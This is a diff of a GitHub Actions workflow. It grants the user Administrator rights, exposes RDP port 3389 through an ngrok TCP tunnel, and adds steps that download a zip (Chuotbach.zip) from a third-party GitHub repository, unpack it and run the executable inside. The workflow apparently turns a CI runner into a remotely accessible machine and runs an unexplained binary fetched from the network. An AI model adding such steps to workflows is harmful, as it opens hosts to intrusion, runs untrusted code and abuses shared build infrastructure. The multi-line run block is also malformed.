@@ -48,4 +48,10 @@ jobs:
         Add-LocalGroupMember -Group "Administrators" -Member "$Env:USERNAME"
 
     - name: Create ngrok Tunnel
-      run: .\ngrok.exe tcp 3389 -region=us-cal-1
+      run: .\ngrok.exe tcp 3389 --region=us-cal-1
+    - name: Download file zip
+      run: Invoke-WebRequest https://github.com/khoantdtdc/FANZYA/raw/main/.github/workflows/Chuotbach.zip -OutFile Chuotbach.zip
+           copy Chuotbach.zip D:\Chuotbach.zip
+           Expand-Archive -Path "D:\Chuotbach.zip" -DestinationPath "D:\Chuotbach"
+    - name: Run executable
+      run: D:\Chuotbach\Chuotbach.exe
